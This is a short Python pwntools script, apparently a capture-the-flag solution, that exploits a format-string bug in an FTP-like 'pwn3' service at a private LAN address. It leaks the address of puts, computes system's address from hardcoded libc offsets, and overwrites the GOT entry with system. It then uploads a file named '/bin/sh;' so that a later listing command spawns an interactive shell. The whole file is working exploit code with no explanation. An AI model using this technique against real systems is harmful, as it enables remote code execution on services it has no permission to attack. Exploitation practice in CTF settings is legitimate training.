# -*- coding: utf-8 -*-

from pwn import *

sh = remote("192.168.18.104",10002)
pwn3 = ELF('./pwn3')

puts_got = pwn3.got['puts']

password = 'rxraclhm'

sh.sendlineafter("Name (ftp.hacker.server:Rainism):",password)

sh.sendlineafter("ftp>","put")

payload = '%8$s' + p32(puts_got)
file_name = 'AAAA'

sh.sendlineafter("please enter the name of the file you want to upload:",file_name)

sh.sendlineafter("then, enter the content:",payload)

sh.sendlineafter("ftp>","get")

sh.sendlineafter("enter the file name you want to get:","AAAA")

result = sh.recv()[0:4]

puts_addr = u32(result)

print "[puts_addr]: " + hex(puts_addr)

puts_offset = 0x071290
system_offset = 0x045420

libcbase = puts_addr - puts_offset
system_addr = libcbase + system_offset

print "[system_addr]: " + hex(system_addr)

payload1 = fmtstr_payload(7,{puts_got:system_addr})

sh.sendline("put")

file_name_1 = '/bin/sh;'

sh.sendlineafter("please enter the name of the file you want to upload:",file_name_1)

sh.sendlineafter("then, enter the content:",payload1)

sh.sendlineafter("ftp>","get")

sh.sendlineafter("enter the file name you want to get:",file_name_1)

sh.sendlineafter("ftp>","dir")

sh.interactive()